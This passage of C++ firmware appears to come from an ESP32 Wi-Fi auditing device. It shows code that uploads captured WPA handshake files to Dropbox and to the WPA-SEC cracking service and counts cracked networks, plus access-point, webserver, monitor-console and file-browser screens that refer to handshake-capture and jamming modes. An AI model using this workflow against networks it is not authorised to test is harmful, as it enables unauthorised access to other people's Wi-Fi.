  auto uploadOne = [&](const char* sdPath, int& done, int& errs) {
    String remote = cfg.dropbox_folder;
    if (remote.endsWith("/")) remote.remove(remote.length() - 1);
    remote += sdPath;
    auto res = DropboxClient::uploadFile(SD, sdPath, cfg.dropbox_token.c_str(), remote.c_str());
    if (res.ok) { done++; }
    else { errs++; Serial.printf("[sync] fail: %s %s\n", sdPath, res.error); }
  };

  int done = 0, errors = 0;
  char nameBuf[64];

  // ── Root-level NEONDRIVE files ─────────────────────────────────────────────
  {
    File root = SD.open("/");
    if (root) {
      while (true) {
        File e = root.openNextFile();
        if (!e) break;
        bool isDir = e.isDirectory();
        strncpy(nameBuf, e.name(), sizeof(nameBuf) - 1);
        nameBuf[sizeof(nameBuf) - 1] = '\0';
        e.close();
        if (isDir || !isNeondriveRootFile(nameBuf)) continue;
        char sdPath[68];
        snprintf(sdPath, sizeof(sdPath), "/%s", nameBuf);
        uploadOne(sdPath, done, errors);
      }
      root.close();
    }
  }

  // ── /captures/ directory — .pcap and .22000 files ─────────────────────────
  {
    File capDir = SD.open("/captures");
    if (capDir && capDir.isDirectory()) {
      while (true) {
        File e = capDir.openNextFile();
        if (!e) break;
        bool isDir = e.isDirectory();
        strncpy(nameBuf, e.name(), sizeof(nameBuf) - 1);
        nameBuf[sizeof(nameBuf) - 1] = '\0';
        e.close();
        if (isDir) continue;
        const char* ext = strrchr(nameBuf, '.');
        if (!ext) continue;
        if (strcasecmp(ext, ".pcap") != 0 && strcasecmp(ext, ".22000") != 0) continue;
        char sdPath[80];
        snprintf(sdPath, sizeof(sdPath), "/captures/%s", nameBuf);
        uploadOne(sdPath, done, errors);
      }
      capDir.close();
    }
  }

  snprintf(syncDropboxStatus, sizeof(syncDropboxStatus), "OK %d e:%d", done, errors);
}

static void drawSync();  // forward

static void syncWithWPASec() {
  if (wpasecSyncInProgress) {
    Serial.println("[wpasec] Sync already in progress");
    return;
  }

  if (cfg.wpasec_apikey.isEmpty()) {
    wpasecSyncStatus = "API key not configured";
    Serial.println("[wpasec] Cannot sync: API key not set");
    return;
  }

  wpasecSyncInProgress = true;
  wpasecSyncStatus = "Syncing...";
  Serial.println("[wpasec] Starting sync with WPA-SEC");

  if (!mountSdCard(false)) {
    wpasecSyncStatus = "SD card not available";
    wpasecSyncInProgress = false;
    return;
  }

  // Load cache if not already loaded
  if (!WPASecClient::isBusy()) {
    Serial.println("[wpasec] Loading cache from SD/LittleFS");
    WPASecClient::loadCache(SD, "/wpasec_results.txt", "/wpasec_uploaded.txt");
  }

  // Sync captures from /captures first
  Serial.println("[wpasec] Scanning /captures directory");
  WPASecSyncResult result = WPASecClient::syncCaptures(
    SD,
    "/captures",
    "/wpasec_uploaded.txt",
    "/wpasec_results.txt",
    cfg.wpasec_apikey,
    [](const char* status, uint16_t progress, uint16_t total) {
      Serial.printf("[wpasec] %s (%u/%u)\n", status, progress, total);
    }
  );

  // YOINK handshakes are in /captures/<SSID>/Handshakes/ — covered by the /captures/ scan above.
  // The recursive scan already finds .pcap and .22000 files in all Handshakes subdirectories.

  // Update status
  if (result.success || result.uploaded > 0) {
    char summary[128];
    snprintf(summary, sizeof(summary), "Uploaded: %u, Cracked: %u", 
             result.uploaded, result.cracked);
    wpasecSyncStatus = summary;
    crackedNetworks = result.cracked;
    Serial.printf("[wpasec] Sync complete: %s\n", summary);
  } else {
    wpasecSyncStatus = "Sync failed";
    Serial.printf("[wpasec] Sync failed: %s\n", result.error);
  }

  wpasecSyncInProgress = false;
}

static void downloadWPASecResults() {
  if (cfg.wpasec_apikey.isEmpty()) {
    wpasecSyncStatus = "API key not configured";
    Serial.println("[wpasec] Cannot download: API key not set");
    return;
  }

  Serial.println("[wpasec] Downloading results from WPA-SEC");
  wpasecSyncStatus = "Downloading...";

  // The WPASecClient syncing process already downloads results
  // So we just trigger another full sync
  syncWithWPASec();
}

static void drawWebserver() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Webserver & AP");
  drawUniversalBackground();

  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  int wifiStatus = WiFi.status();
  uint8_t apClients = WiFi.softAPgetStationNum();
  const int gap = 6;

  // Hard bands: top status, middle detail, service row, bottom control row.
  // This prevents text from ever drawing over buttons.
  const int bottomBtnW = (bottom.w - (gap * 2)) / 3;
  const int serviceH = UI_BUTTON_H;
  const int serviceY = bottom.y - serviceH - 6;
  // Title text is drawn near y=8; keep status box top border ~10px below that title band.
  const int topStatusY = 34;
  const int topStatusH = 60;  // Uses the empty area under "Webserver & AP".
  const int leftX = content.x;
  const int leftW = max(120, uiRightLimitForBand(topStatusY, topStatusH) - content.x);
  const int detailsY = topStatusY + topStatusH + 4;
  const int detailsH = max(24, serviceY - detailsY - 4);

  btnWebserverBack = {bottom.x, bottom.y, bottomBtnW, UI_BUTTON_H, "Back"};
  btnWebserverStartAP = {bottom.x + bottomBtnW + gap, bottom.y, bottomBtnW, UI_BUTTON_H, apMode ? "Stop AP" : "Start AP"};
  btnWebserverStartServer = {bottom.x + (bottomBtnW + gap) * 2, bottom.y, bottomBtnW, UI_BUTTON_H,
                             webServerRunning ? "Stop Web" : "Start Web"};

  const int serviceW = (leftW - gap) / 2;
  btnWebserverWpaSecSync = {leftX, serviceY, serviceW, serviceH, "Sync WPA-SEC"};
  btnWebserverDownloadResults = {leftX + serviceW + gap, serviceY, serviceW, serviceH, "Get Results"};

  drawButton(btnWebserverBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);
  drawButton(btnWebserverStartAP, apMode ? TFT_MAROON : TFT_DARKGREEN, TFT_WHITE, TFT_WHITE);
  drawButton(btnWebserverStartServer, webServerRunning ? TFT_MAROON : TFT_DARKGREEN, TFT_WHITE, TFT_WHITE);
  drawButton(btnWebserverWpaSecSync, wpasecSyncInProgress ? TFT_DARKGREY : TFT_BLUE, TFT_WHITE, TFT_WHITE);
  drawButton(btnWebserverDownloadResults, TFT_DARKCYAN, TFT_WHITE, TFT_WHITE);

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);

  // Top status window (requested position under title text).
  tft.drawRoundRect(leftX, topStatusY, leftW, topStatusH, 5, TFT_DARKGREY);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.drawString("STATUS", leftX + 4, topStatusY + 3);

  auto trimToWidth = [&](String s, int maxW) -> String {
    while (s.length() > 4 && tft.textWidth(s) > maxW) s.remove(s.length() - 1);
    return s;
  };

  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  String staLine = (wifiStatus == WL_CONNECTED) ? ("STA: Connected  " + WiFi.SSID()) : String("STA: Not connected");
  staLine = trimToWidth(staLine, leftW - 10);
  tft.drawString(staLine, leftX + 4, topStatusY + 17);

  String apLine = String("AP: ") + (apMode ? "Active" : "Inactive") + "  Clients:" + String(apClients);
  apLine = trimToWidth(apLine, leftW - 10);
  tft.drawString(apLine, leftX + 4, topStatusY + 29);

  String staIpLine = String("STA IP: ") + ((wifiStatus == WL_CONNECTED) ? WiFi.localIP().toString() : String("-"));
  staIpLine = trimToWidth(staIpLine, leftW - 10);
  tft.drawString(staIpLine, leftX + 4, topStatusY + 41);

  // Middle left details panel.
  tft.drawRect(leftX, detailsY, leftW, detailsH, TFT_DARKGREY);
  int rowY = detailsY + 4;
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString(webServerRunning ? "Web: ONLINE" : "Web: OFFLINE", leftX + 4, rowY);
  rowY += 11;
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  String accessUrl = "-";
  if (webServerRunning) {
    if (wifiStatus == WL_CONNECTED) accessUrl = "http://" + WiFi.localIP().toString() + ":8080";
    else if (apMode) accessUrl = "http://192.168.4.1:8080";
  }
  accessUrl = trimToWidth(accessUrl, leftW - 10);
  tft.drawString(accessUrl, leftX + 4, rowY);
  rowY += 11;
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  String syncState = wpasecSyncInProgress ? "WPA-SEC: Syncing..." : ("WPA-SEC: " + (wpasecSyncStatus.isEmpty() ? String("Idle") : wpasecSyncStatus));
  syncState = trimToWidth(syncState, leftW - 10);
  tft.drawString(syncState, leftX + 4, rowY);

  // Right-side utility panel (uses free space marked in photo).
  const int rightX = uiActionDockSafeRight();
  const int rightW = max(48, (content.x + content.w) - rightX);
  const int rightY = topStatusY + topStatusH + 4;
  const int rightH = max(20, serviceY - rightY - 4);
  if (rightW > 40 && rightH > 16) {
    tft.drawRect(rightX, rightY, rightW, rightH, TFT_DARKGREY);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("AP", rightX + 3, rightY + 3);
    if (apMode && apClients > 0) {
      wifi_sta_list_t staList;
      if (esp_wifi_ap_get_sta_list(&staList) == ESP_OK && staList.num > 0) {
        char mac[24];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 staList.sta[0].mac[0], staList.sta[0].mac[1], staList.sta[0].mac[2],
                 staList.sta[0].mac[3], staList.sta[0].mac[4], staList.sta[0].mac[5]);
        String macLine = trimToWidth(String(mac), rightW - 6);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.drawString(macLine, rightX + 3, rightY + 14);
      }
    } else {
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.drawString("No clients", rightX + 3, rightY + 14);
    }
  }

  uiLogLayout("drawWebserver", content, bottom);
  uiLogButtonRect("Web.Back", btnWebserverBack);
  uiLogButtonRect("Web.AP", btnWebserverStartAP);
  uiLogButtonRect("Web.Toggle", btnWebserverStartServer);
  uiLogButtonRect("Web.Sync", btnWebserverWpaSecSync);
  uiLogButtonRect("Web.Results", btnWebserverDownloadResults);
  drawBorder();
}

// Dynamic status line Y on WIFI_CONNECT (derived from current layout).

static void refreshWifiStatusLine() {
  if (screen != ScreenId::WIFI_CONNECT && screen != ScreenId::WIFI_SCAN) return;
  if (screen == ScreenId::WIFI_SCAN) return;
  if (wifiConnectShowPasswordModal) return;
  const int w = tft.width();
  const int statusY = wifiConnectStatusLineY();
  const UiRect bottom = computeBottomBarRect();
  if (statusY >= (bottom.y - 2)) return;
  // Clear status line area
  tft.fillRect(0, statusY - 2, w, 18, TFT_BLACK);
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  int ws = WiFi.status();
  if (ws == WL_CONNECTED) {
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("Status: Connected  " + WiFi.localIP().toString(), 8, statusY);
  } else if (wifiConnectInProgress) {
    uint32_t elapsed = (millis() - wifiConnectAttemptMs) / 1000;
    char buf[64];
    snprintf(buf, sizeof(buf), "Status: Connecting... %lus", elapsed);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString(buf, 8, statusY);
  } else {
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("Status: " + wifiConnectStatus, 8, statusY);
  }
}

static void updateWifiConnectStatus() {
  wifiConnectTick(
    (screen == ScreenId::WIFI_CONNECT || screen == ScreenId::WIFI_SCAN),
    wifiConnectInProgress,
    wifiConnectStatus,
    wifiConnectAttemptMs,
    wifiConnectSsid,
    wifiConnectPassword,
    cfg,
    (screen == ScreenId::WIFI_SCAN) ? drawWifiScan : drawWifiConnect,
    refreshWifiStatusLine,
    pushConsoleEventf
  );
}

static void wifiConnectScanTick() {
  if (!wifiConnectScanActive) return;

  int poll = pollWifiScanAsync();
  if (poll == 0) {
    if (millis() - wifiConnectScanStartedMs > 30000) {
      wifiConnectScanActive = false;
      wifiIsScanning = false;
      WiFi.scanDelete();
      wifiConnectStatus = "Scan timeout";
      Serial.println("[wifi] async scan timeout");
      if (screen == ScreenId::WIFI_CONNECT) drawWifiConnect();
      if (screen == ScreenId::WIFI_SCAN) drawWifiScan();
    }
    return;
  }

  wifiConnectScanActive = false;
  if (poll > 0) {
    wifiConnectStatus = "Scan complete: " + String(apCount) + " APs";
    Serial.printf("[wifi] async scan complete: %d networks\n", apCount);
  } else {
    wifiConnectStatus = "Scan failed";
    Serial.println("[wifi] async scan failed");
  }
  if (screen == ScreenId::WIFI_CONNECT) drawWifiConnect();
  if (screen == ScreenId::WIFI_SCAN) drawWifiScan();
}

static void monitorPushLine(uint16_t color, const char* fmt, ...) {
  char buf[80];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);

  // Compact verbose mode tags so more payload text is visible in live console.
  auto compactConsoleTag = [](char* s) {
    if (!s || s[0] == '\0') return;
    if (strncmp(s, "[YOINK]", 7) == 0) {
      memmove(s + 3, s + 7, strlen(s + 7) + 1);
      memcpy(s, "[Y]", 3);
      return;
    }
    if (strncmp(s, "[RAW]", 5) == 0) {
      memmove(s + 3, s + 5, strlen(s + 5) + 1);
      memcpy(s, "[R]", 3);
      return;
    }
    if (strncmp(s, "[JAMMIT]", 8) == 0) {
      memmove(s + 3, s + 8, strlen(s + 8) + 1);
      memcpy(s, "[J]", 3);
      return;
    }
    if (strncmp(s, "YOINK ", 6) == 0) {
      memmove(s + 4, s + 6, strlen(s + 6) + 1);
      memcpy(s, "[Y]", 3);
      s[3] = ' ';
      return;
    }
    if (strncmp(s, "RAW ", 4) == 0) {
      memmove(s + 4, s + 4, strlen(s + 4) + 1);
      memcpy(s, "[R]", 3);
      s[3] = ' ';
      return;
    }
    if (strncmp(s, "JAMMIT ", 7) == 0) {
      memmove(s + 4, s + 7, strlen(s + 7) + 1);
      memcpy(s, "[J]", 3);
      s[3] = ' ';
      return;
    }
  };
  compactConsoleTag(buf);

  if (monitorLineCount < MONITOR_MAX_LINES) {
    strncpy(monitorLines[monitorLineCount].text, buf, sizeof(monitorLines[monitorLineCount].text) - 1);
    monitorLines[monitorLineCount].text[sizeof(monitorLines[monitorLineCount].text) - 1] = '\0';
    monitorLines[monitorLineCount].color = color;
    monitorLineCount++;
    return;
  }

  for (int i = 1; i < MONITOR_MAX_LINES; i++) {
    monitorLines[i - 1] = monitorLines[i];
  }
  strncpy(monitorLines[MONITOR_MAX_LINES - 1].text, buf, sizeof(monitorLines[MONITOR_MAX_LINES - 1].text) - 1);
  monitorLines[MONITOR_MAX_LINES - 1].text[sizeof(monitorLines[MONITOR_MAX_LINES - 1].text) - 1] = '\0';
  monitorLines[MONITOR_MAX_LINES - 1].color = color;
}

// Update a specific line in place without scrolling (for Raw mode)
static void monitorUpdateLine(int lineIdx, uint16_t color, const char* fmt, ...) {
  if (lineIdx < 0 || lineIdx >= MONITOR_MAX_LINES) return;
  
  char buf[80];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);

  // Keep in-place raw/telemetry updates short too.
  if (strncmp(buf, "[RAW]", 5) == 0) {
    memmove(buf + 3, buf + 5, strlen(buf + 5) + 1);
    memcpy(buf, "[R]", 3);
  }
  
  strncpy(monitorLines[lineIdx].text, buf, sizeof(monitorLines[lineIdx].text) - 1);
  monitorLines[lineIdx].text[sizeof(monitorLines[lineIdx].text) - 1] = '\0';
  monitorLines[lineIdx].color = color;
  
  // Ensure we track this line as visible
  if (lineIdx >= monitorLineCount) {
    monitorLineCount = lineIdx + 1;
  }
}

static const char* monitorPktTypeStr(uint8_t t) {
  if (t == WIFI_PKT_MGMT) return "MGMT";
  if (t == WIFI_PKT_CTRL) return "CTRL";
  if (t == WIFI_PKT_DATA) return "DATA";
  return "UNK";
}

static bool monitorNameEndsWithIgnoreCase(const char* name, const char* suffix) {
  if (!name || !suffix) return false;
  size_t nLen = strlen(name);
  size_t sLen = strlen(suffix);
  if (nLen < sLen) return false;
  for (size_t i = 0; i < sLen; i++) {
    char a = name[nLen - sLen + i];
    char b = suffix[i];
    if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
    if (b >= 'A' && b <= 'Z') b = (char)(b - 'A' + 'a');
    if (a != b) return false;
  }
  return true;
}

static bool monitorAllowFileName(const char* name) {
  return monitorNameEndsWithIgnoreCase(name, ".pcap") ||
         monitorNameEndsWithIgnoreCase(name, ".pcapng") ||
         monitorNameEndsWithIgnoreCase(name, ".log") ||
         monitorNameEndsWithIgnoreCase(name, ".txt") ||
         monitorNameEndsWithIgnoreCase(name, ".csv") ||
         monitorNameEndsWithIgnoreCase(name, ".json");
}

static void monitorSetFileInfo(const char* txt) {
  strncpy(monitorFileInfo, txt ? txt : "", sizeof(monitorFileInfo) - 1);
  monitorFileInfo[sizeof(monitorFileInfo) - 1] = '\0';
}

static bool monitorColorAllowedForFilter(uint16_t c) {
  if (monitorTab5Filter == 0) return true;
  const bool isErr = (c == TFT_RED);
  const bool isWarn = (c == TFT_YELLOW || c == TFT_ORANGE);
  const bool isInfo = (c == TFT_CYAN || c == TFT_GREEN || c == TFT_MAGENTA || c == TFT_WHITE || c == TFT_DARKGREY);
  if (monitorTab5Filter == 3) return isErr;
  if (monitorTab5Filter == 2) return isErr || isWarn;
  return isErr || isWarn || isInfo;
}

static bool monitorIsLikelyTextFile(fs::FS& fs, const char* path) {
  File f = fs.open(path, FILE_READ);
  if (!f) return false;
  const size_t sample = 256;
  uint8_t buf[sample];
  size_t n = f.read(buf, sample);
  f.close();
  if (n == 0) return true;
  size_t bad = 0;
  for (size_t i = 0; i < n; i++) {
    uint8_t b = buf[i];
    if (b == 9 || b == 10 || b == 13) continue;
    if (b >= 32 && b <= 126) continue;
    bad++;
  }
  return bad < (n / 8);
}

static void monitorLoadViewFile() {
  monitorViewLineCount = 0;
  monitorViewScroll = 0;
  if (!monitorViewPath[0]) return;
  fs::FS& fsRef = monitorViewUseSd ? (fs::FS&)SD : (fs::FS&)LittleFS;
  if (monitorViewUseSd && !sdReady && !mountSdCard(false)) {
    monitorSetFileInfo("SD not ready");
    return;
  }
  if (!monitorIsLikelyTextFile(fsRef, monitorViewPath)) {
    monitorSetFileInfo("Binary/non-text preview unsupported");
    return;
  }
  File f = fsRef.open(monitorViewPath, FILE_READ);
  if (!f) {
    monitorSetFileInfo("Open failed");
    return;
  }
  while (f.available() && monitorViewLineCount < 32) {
    String line = f.readStringUntil('\n');
    line.replace("\r", "");
    line.trim();
    strncpy(monitorViewLines[monitorViewLineCount], line.c_str(), sizeof(monitorViewLines[monitorViewLineCount]) - 1);
    monitorViewLines[monitorViewLineCount][sizeof(monitorViewLines[monitorViewLineCount]) - 1] = '\0';
    monitorViewLineCount++;
  }
  f.close();
  if (monitorViewLineCount == 0) monitorSetFileInfo("File is empty");
}

static void monitorLoadFileDirFs(fs::FS& fsRef, const char* path, bool fromSd) {
  monitorFileCount = 0;
  if (!path || !path[0]) path = "/";
  if (fromSd && !sdReady && !mountSdCard(false)) {
    monitorSetFileInfo("SD not ready");
    return;
  }
  strncpy(monitorFilePath, path, sizeof(monitorFilePath) - 1);
  monitorFilePath[sizeof(monitorFilePath) - 1] = '\0';
  File dir = fsRef.open(monitorFilePath);
  if (!dir || !dir.isDirectory()) {
    if (dir) dir.close();
    monitorSetFileInfo("Path unavailable");
    strncpy(monitorFilePath, "/", sizeof(monitorFilePath) - 1);
    monitorFilePath[sizeof(monitorFilePath) - 1] = '\0';
    return;
  }
  while (true) {
    File entry = dir.openNextFile();
    if (!entry) break;
    if (monitorFileCount >= MONITOR_FILE_MAX) {
      entry.close();
      continue;
    }
    String nm = entry.name();
    int slash = nm.lastIndexOf('/');
    if (slash >= 0 && slash + 1 < (int)nm.length()) nm = nm.substring(slash + 1);
    if (nm.length() == 0) {
      entry.close();
      continue;
    }
    const bool isDir = entry.isDirectory();
    if (!isDir && !monitorAllowFileName(nm.c_str())) {
      entry.close();
      continue;
    }
    MonitorFileEntry& out = monitorFiles[monitorFileCount++];
    strncpy(out.name, nm.c_str(), sizeof(out.name) - 1);
    out.name[sizeof(out.name) - 1] = '\0';
    out.isDir = isDir;
    out.size = isDir ? 0U : (uint32_t)entry.size();
    entry.close();
  }
  dir.close();
  int maxScroll = monitorFileCount - monitorFileVisibleRows;
  if (maxScroll < 0) maxScroll = 0;
  monitorFileScroll = clampi(monitorFileScroll, 0, maxScroll);
  monitorFileLastRefreshMs = millis();
  monitorSetFileInfo((monitorFileCount > 0) ? "Tap folder/file" : "No matching files");
}

static void monitorLoadFileDir(const char* path) {
  monitorLoadFileDirFs(SD, path, true);
}

static void monitorGoParentDir() {
  if (strcmp(monitorFilePath, "/") == 0) return;
  char nextPath[96];
  strncpy(nextPath, monitorFilePath, sizeof(nextPath) - 1);
  nextPath[sizeof(nextPath) - 1] = '\0';
  int len = (int)strlen(nextPath);
  while (len > 1 && nextPath[len - 1] == '/') {
    nextPath[len - 1] = '\0';
    len--;
  }
  while (len > 1 && nextPath[len - 1] != '/') {
    nextPath[len - 1] = '\0';
    len--;
  }
  if (len <= 1) {
    strcpy(nextPath, "/");
  }
  monitorFileScroll = 0;
  monitorLoadFileDirFs(monitorFileUseSd ? (fs::FS&)SD : (fs::FS&)LittleFS, nextPath, monitorFileUseSd);
  if (monitorFileUseSd) {
    strncpy(monitorSdPath, monitorFilePath, sizeof(monitorSdPath) - 1);
    monitorSdPath[sizeof(monitorSdPath) - 1] = '\0';
  } else {
    strncpy(monitorLfsPath, monitorFilePath, sizeof(monitorLfsPath) - 1);
    monitorLfsPath[sizeof(monitorLfsPath) - 1] = '\0';
  }
}

static void monitorEnterDir(const char* name) {
  if (!name || !name[0]) return;
  char nextPath[96];
  if (strcmp(monitorFilePath, "/") == 0) {
    snprintf(nextPath, sizeof(nextPath), "/%s", name);
  } else {
    snprintf(nextPath, sizeof(nextPath), "%s/%s", monitorFilePath, name);
  }
  monitorFileScroll = 0;
  monitorLoadFileDirFs(monitorFileUseSd ? (fs::FS&)SD : (fs::FS&)LittleFS, nextPath, monitorFileUseSd);
  if (monitorFileUseSd) {
    strncpy(monitorSdPath, monitorFilePath, sizeof(monitorSdPath) - 1);
    monitorSdPath[sizeof(monitorSdPath) - 1] = '\0';
  } else {
    strncpy(monitorLfsPath, monitorFilePath, sizeof(monitorLfsPath) - 1);
    monitorLfsPath[sizeof(monitorLfsPath) - 1] = '\0';
  }
}

// Track which yoink log seq we've already pushed to monitor
static uint32_t monitorYoinkLastSeq = 0;

static void monitorReset() {
  monitorLineCount = 0;
  monitorLastUpdateMs = 0;
  monitorLayoutDrawn = false;
  monitorDrawnCount = -1;
  for (int i = 0; i < MONITOR_MAX_LINES; i++) {
    monitorDrawnSig[i] = 0;
    monitorDrawnColor[i] = 0;
  }
  monitorLastPkts = sniffPacketCount;
  monitorLastBeacon = monBeaconHits;
  monitorLastHs = monHandshakeHits;
  monitorYoinkLastSeq = 0;
  monitorFileLastRefreshMs = 0;
  monitorFileScroll = 0;
  monitorFileCount = 0;
  monitorFileUseSd = true;
  strcpy(monitorSdPath, "/");
  strcpy(monitorLfsPath, "/");
  monitorViewPath[0] = '\0';
  monitorViewLineCount = 0;
  monitorViewScroll = 0;
  monitorTab5Tab = MonitorTab5Tab::LIVE;
  monitorTab5Paused = false;
  monitorTab5AutoScroll = true;
  monitorTab5Filter = 0;
  monitorSetFileInfo("");
  // Reset Raw mode tracking
  rawMonLastPkts = 0;
  rawMonLastMgmt = 0;
  rawMonLastCtrl = 0;
  rawMonLastData = 0;
  rawMonLastBeacon = 0;
  rawMonLastHs = 0;
  rawMonLastDropped = 0;
  rawMonLastErrors = 0;
  rawMonLastPps = 0;
  
  monitorPushLine(TFT_CYAN, "MONITOR ONLINE");
  if (autoMode == AutoMode::Y0INK) {
    monitorPushLine(TFT_GREEN, "YOINK engine active");
  } else if (autoMode == AutoMode::JAMMIT) {
    monitorPushLine(TFT_RED, "JAMMIT telemetry active (safe)");
  } else if (autoMode == AutoMode::SP3CTER) {
    monitorPushLine(TFT_CYAN, "RAW CAPTURE active");
  }
  monitorPushLine(TFT_WHITE, "Waiting for data...");
}

static void drawMonitor() {
  const int w = tft.width();
  const int h = tft.height();
#if defined(NEONDRIVE_TARGET_M5TAB5)
  static bool s_tab5ChromeDrawn = false;
  static int s_prevW = -1;
  static int s_prevH = -1;
  static int s_prevRotation = -1;
  static bool s_prevLandscape = true;
  static MonitorTab5Tab s_prevTab = MonitorTab5Tab::LIVE;
  const int rotationNow = tft.getRotation() & 3;
  const bool landscape = (w >= h);
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int pad = landscape ? 14 : 10;
  const int tabH = landscape ? 42 : 38;
  const int ctlH = landscape ? 38 : 42;
  const int fsRowH = landscape ? 30 : 36;
  // bodySize / titleSize replaced by applyFontSm/Md() at each use site
  const int boxX = content.x + pad;
  const int boxY = content.y + tabH + 10;
  const int boxW = max(120, min(w - pad * 2 - content.x, uiActionDockSafeLeft() - boxX - 4));
  const int boxH = max(80, bottom.y - boxY - 8);
  // Hard geometry guardrails to keep text inside panel bounds.
  static constexpr int kPanelInsetL = 8;
  static constexpr int kPanelInsetR = 8;
  static constexpr int kPanelInsetT = 6;
  static constexpr int kPanelInsetB = 8;
  static constexpr int kPanelHeaderBandH = 26;
  static constexpr int kPanelFooterBandH = 18;
  const bool chromeDirty = !s_tab5ChromeDrawn || s_prevW != w || s_prevH != h || s_prevRotation != rotationNow || s_prevLandscape != landscape || s_prevTab != monitorTab5Tab;
  const int panelInnerX = boxX + kPanelInsetL;
  const int panelInnerY = boxY + kPanelInsetT;
  const int panelInnerW = max(20, boxW - (kPanelInsetL + kPanelInsetR));
  const int panelInnerH = max(20, boxH - (kPanelInsetT + kPanelInsetB));
  const int panelTextMaxW = max(20, panelInnerW - 2);
  const int panelRowsTopY = panelInnerY + kPanelHeaderBandH;
  const int panelRowsBottomY = boxY + boxH - kPanelFooterBandH;
  const int panelRowsH = max(20, panelRowsBottomY - panelRowsTopY);

  if (chromeDirty) {
    tft.fillScreen(TFT_BLACK);
    drawHeader("Monitor Workspace");
    drawUniversalBackground();
  }

  const int tabW = max(52, (boxW - 12) / 4);
  btnMonitorTabLive = {boxX, content.y + 2, tabW, tabH, "LIVE"};
  btnMonitorTabSd = {boxX + tabW + 4, content.y + 2, tabW, tabH, "SD"};
  btnMonitorTabLfs = {boxX + (tabW + 4) * 2, content.y + 2, tabW, tabH, "LFS"};
  btnMonitorTabView = {boxX + (tabW + 4) * 3, content.y + 2, tabW, tabH, "VIEW"};
  btnMonitorBack = {ActionDockBoxX + ((ActionDockBoxW - 78) / 2), bottom.y, 78, UI_BUTTON_H, "Back"};

  if (chromeDirty) {
    drawButton(btnMonitorTabLive, monitorTab5Tab == MonitorTab5Tab::LIVE ? 0x03E0 : TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    drawButton(btnMonitorTabSd, monitorTab5Tab == MonitorTab5Tab::SD ? 0x0410 : TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    drawButton(btnMonitorTabLfs, monitorTab5Tab == MonitorTab5Tab::LITTLEFS ? 0x0410 : TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    drawButton(btnMonitorTabView, monitorTab5Tab == MonitorTab5Tab::FILE_VIEW ? 0x780F : TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    drawButton(btnMonitorBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);
    tft.drawRect(boxX, boxY, boxW, boxH, 0x07FF);
  }
  tft.fillRect(boxX + 1, boxY + 1, boxW - 2, boxH - 2, TFT_BLACK);
  tft.setTextDatum(TL_DATUM);
  if (landscape) { applyFontMd(); } else { applyFontSm(); }
  tft.setTextColor(0xAFE5, TFT_BLACK);

  if (monitorTab5Tab == MonitorTab5Tab::LIVE) {
    btnMonitorPause = {boxX, bottom.y, 82, ctlH, monitorTab5Paused ? "Resume" : "Pause"};
    btnMonitorClear = {boxX + 86, bottom.y, 74, ctlH, "Clear"};
    btnMonitorAuto = {boxX + 164, bottom.y, 98, ctlH, monitorTab5AutoScroll ? "Auto:On" : "Auto:Off"};
    const char* fLabel = (monitorTab5Filter == 0) ? "F:All" : (monitorTab5Filter == 1) ? "F:Info" : (monitorTab5Filter == 2) ? "F:Warn" : "F:Err";
    btnMonitorFilter = {boxX + 266, bottom.y, 84, ctlH, fLabel};
    drawButton(btnMonitorPause, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    drawButton(btnMonitorClear, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    drawButton(btnMonitorAuto, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    drawButton(btnMonitorFilter, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);

    applyFontMd();
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    char hdr[96];
    snprintf(hdr, sizeof(hdr), "sniff=%d pps=%d sd=%d mode=%s", sniffActive ? 1 : 0, sniffPps, sdReady ? 1 : 0, autoModeStr(autoMode));
    String hdrLine(hdr);
    while (hdrLine.length() > 4 && tft.textWidth(hdrLine) > panelTextMaxW) hdrLine.remove(hdrLine.length() - 1);
    tft.drawString(hdrLine, panelInnerX, panelInnerY);
    const int startY = panelRowsTopY;
    const int rowH = landscape ? 20 : 24;
    int visRows = panelRowsH / rowH;
    if (visRows < 4) visRows = 4;

    int shown = 0;
    for (int i = monitorLineCount - 1; i >= 0 && shown < visRows; --i) {
      if (!monitorColorAllowedForFilter(monitorLines[i].color)) continue;
      const int y = startY + shown * rowH;
      if (y + rowH > panelRowsBottomY) break;
      tft.setTextColor(monitorLines[i].color, TFT_BLACK);
      String line = monitorLines[i].text;
      while (line.length() > 4 && tft.textWidth(line) > panelTextMaxW) line.remove(line.length() - 1);
      tft.drawString(line, panelInnerX, y);
      shown++;
    }
  } else if (monitorTab5Tab == MonitorTab5Tab::SD || monitorTab5Tab == MonitorTab5Tab::LITTLEFS) {
    monitorFileUseSd = (monitorTab5Tab == MonitorTab5Tab::SD);
